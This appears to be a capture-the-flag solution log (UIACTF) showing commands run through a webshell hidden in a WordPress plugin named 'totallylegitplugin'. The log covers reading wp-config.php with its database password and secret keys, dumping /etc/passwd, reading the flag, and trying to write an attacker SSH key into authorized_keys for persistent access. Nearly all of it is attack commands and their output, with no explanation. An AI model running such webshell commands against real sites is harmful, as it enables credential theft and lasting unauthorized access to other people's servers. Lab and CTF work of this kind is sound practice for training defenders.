```bash
$ php totallylegitplugin_rev.php


I/O: 0
----------------------------id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

I/O: 1
----------------------------pwd
/var/www/wordpress/wp-content/plugins/totallylegitplugin

I/O: 2
----------------------------ls -al
total 16
drwxr-xr-x 2 www-data www-data 4096 Oct 25 16:02 .
drwxr-xr-x 4 www-data www-data 4096 Oct 25 16:02 ..
-rw-r--r-- 1 www-data www-data  769 Oct 25 16:02 totallylegitplugin.php
-rw-r--r-- 1 www-data www-data  135 Oct 25 16:02 waow.php

I/O: 3
----------------------------cat ../../../wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'wordpress' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'ic`$k}KB}1IJBo;D:ZatLMU:i@JQ ?RHa&/VY^mex0;fw8/zG@x}Y};]@od( dmX' );
define( 'SECURE_AUTH_KEY',  '=V&|!j~@U7O<$e7|alm1ougbQ!TDH@9rgW9)7c+^vml`Eitk.j]t#JGp>:s7^vRs' );
define( 'LOGGED_IN_KEY',    '3fhpShubPz0ZN]hBM-F@%sZkfi,Xb@LP?2|:E.f}Ya^IcbX{BW}{)eCwQaEnE)&)' );
define( 'NONCE_KEY',        'mwb[PKO`L 2y`&o-tilL~+QL:_|,:nPZ>3mOur`5r8v[|2PrDS*}8uHAK=r0J$tl' );
define( 'AUTH_SALT',        ']CqJ0.l>=@zER[aWHA[Y4S/zH1Ye0J3.)l5sERJ&o//d0/!^UOv!{JPji}dpr1F8' );
define( 'SECURE_AUTH_SALT', '{Z~59Of8?i)}sToAjj+>6G;M;(B83nz|qvsx=KAgu<Bs*zh0a-dA*&7<^pUT!O94' );
define( 'LOGGED_IN_SALT',   'U%vfVcso,56/RH*&h4}`65Eb`>M?y4.tED7Ra+=sD{AsNmI,NN)_pd?YFugP#[Kd' );
define( 'NONCE_SALT',       'Vs%duY>0Wj]N$c}=`nedz+0jc@yHQml!q*o]YaMwRG[;tJnR1JB]>pfz3#R|2qwu' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

define('COOKIE_DOMAIN', 'kulebloggen.uiactf');
define('DOMAIN_CURRENT_SITE', 'http://kulebloggen.uiactf');
define('SITECOOKIEPATH', '.');
define('WP_HOME', 'http://kulebloggen.uiactf');
define('WP_SITEURL', 'http://kulebloggen.uiactf');

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

I/O: 4
----------------------------cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
wordpress:x:1000:1000:wordpress:/home/wordpress:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false

I/O: 5
----------------------------ls -al /home/wordpress
total 20736
drwxr-xr-x 4 wordpress wordpress     4096 Oct 25 15:49 .
drwxr-xr-x 3 root      root          4096 Oct 24 17:01 ..
-rwxr-xr-x 1 wordpress wordpress     2598 Oct 24 23:13 .bash_history
-rwxr-xr-x 1 wordpress wordpress      220 Jan  6  2022 .bash_logout
-rwxr-xr-x 1 wordpress wordpress     3771 Jan  6  2022 .bashrc
drwxr-xr-x 2 wordpress wordpress     4096 Oct 24 17:01 .cache
-rw------- 1 wordpress wordpress       20 Oct 25 15:32 .lesshst
-rwxr-xr-x 1 wordpress wordpress      807 Jan  6  2022 .profile
drwxr-xr-x 2 wordpress wordpress     4096 Oct 24 17:01 .ssh
-rwxr-xr-x 1 wordpress wordpress        0 Oct 24 17:02 .sudo_as_admin_successful
-rwxr-xr-x 1 wordpress wordpress    13092 Oct 25 15:49 .viminfo
-rwxr-xr-x 1 wordpress wordpress       38 Oct 25 15:49 flag.txt
-rwxr-xr-x 1 wordpress wordpress 21172651 Oct 17 21:11 latest.tar.gz

I/O: 6
----------------------------cat /home/wordpress/flag.txt
UIACTF{kryptert webshell er noe herk}

I/O: 7
----------------------------echo -n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCpeypny4fWy0kAEDajanSOOQ5UN9c+lBrEbHZ1mLi2xw6oMxFG/xLKxt4rmP+lo/ARLJ5GDpzUKLKr90GO+KMZ5zZs8gi7CpOFokjc9jj9QOpNcq33f/EfAkeGh6THrMasNLHwkGkUKREJQ+6RwRwPr5UzyZ0DwnhsgWXuAYcN/fTjiKjPCinZIVXNCryG5OLvO23QISMyHkNDiUKkJt6T/CBmEGkJnyl81xujv4L6FYA2Ryik6rUMOqkgdv83MaxOrplY5eof+H7VXjhezPYdlYt6sfPq1kNSWUkcuJp/1oNKiA+1SFVPk0IvruwYqeD4bolxKuHfkOktvhyFO36AVaD1tgT3x6SepluFSIRS7Sj1vqU9rtYeCXgOw5HTHta9kL55gTdbw8BuaxBIpbPKFDa53rGW/b1SXfvssbGIYHR25QwQ9PFoeGX4JHcHvZepRI3JqxUAlBk4JvGBUBNanyKtslpm9FNdfpgerI26d4sbGXSSJjd2uwRzCaL47U=
 > /home/wordpress/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCpeypny4fWy0kAEDajanSOOQ5UN9c+lBrEbHZ1mLi2xw6oMxFG/xLKxt4rmP+lo/ARLJ5GDpzUKLKr90GO+KMZ5zZs8gi7CpOFokjc9jj9QOpNcq33f/EfAkeGh6THrMasNLHwkGkUKREJQ+6RwRwPr5UzyZ0DwnhsgWXuAYcN/fTjiKjPCinZIVXNCryG5OLvO23QISMyHkNDiUKkJt6T/CBmEGkJnyl81xujv4L6FYA2Ryik6rUMOqkgdv83MaxOrplY5eof+H7VXjhezPYdlYt6sfPq1kNSWUkcuJp/1oNKiA+1SFVPk0IvruwYqeD4bolxKuHfkOktvhyFO36AVaD1tgT3x6SepluFSIRS7Sj1vqU9rtYeCXgOw5HTHta9kL55gTdbw8BuaxBIpbPKFDa53rGW/b1SXfvssbGIYHR25QwQ9PFoeGX4JHcHvZepRI3JqxUAlBk4JvGBUBNanyKtslpm9FNdfpgerI26d4sbGXSSJjd2uwRzCaL47U=

I/O: 8
----------------------------ls -al /home/wordpress/.ssh
total 8
drwxr-xr-x 2 wordpress wordpress 4096 Oct 24 17:01 .
drwxr-xr-x 4 wordpress wordpress 4096 Oct 25 15:49 ..
-rwxr-xr-x 1 wordpress wordpress    0 Oct 24 17:01 authorized_keys
```

## Flagg
`UIACTF{kryptert webshell er noe herk}`
